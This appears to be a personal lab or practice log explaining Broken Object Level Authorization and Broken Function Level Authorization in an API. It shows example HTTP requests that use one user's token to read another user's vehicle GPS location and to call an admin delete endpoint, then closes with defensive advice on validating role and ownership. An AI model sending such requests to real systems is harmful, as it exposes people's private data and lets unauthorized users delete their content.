# API Authorization Attacks — 2025-12-07

Today I practiced two of the most dangerous API vulnerabilities:

* Broken Object Level Authorization (BOLA)
* Broken Function Level Authorization (BFLA)

These bugs are simple to exploit and extremely dangerous in production systems.

---

## Broken Object Level Authorization (BOLA)

BOLA happens when the API does not verify that the authenticated user owns the requested object.

### Original request (User B)

```http
GET /identity/api/v2/vehicle/943186f6-b753-4629-a9dc-cdb444fb90d/location
Authorization: Bearer USER_B_TOKEN
```

### Attack (User A token, same ID)

```http
GET /identity/api/v2/vehicle/943186f6-b753-4629-a9dc-cdb444fb90d/location
Authorization: Bearer USER_A_TOKEN
```

Result:
User A successfully accessed User B’s live GPS location.
This confirms a BOLA vulnerability.

---

## Broken Function Level Authorization (BFLA)

BFLA happens when a user can access actions outside their role.

### Admin endpoint exposed to normal user

```http
DELETE /identity/api/v2/admin/videos/758
Authorization: Bearer USER_B_TOKEN
```

Response:

```json
{
  "message": "User video deleted successfully",
  "status": 200
}
```

A normal user was able to delete another user’s video using an admin endpoint.

---

## Key Notes

* Tokens alone do not prevent authorization bugs.
* Every request must validate:

  * Who the user is
  * What their role is
  * Whether they own the resource

---

## Tools Used

* Postman
* Burp Suite
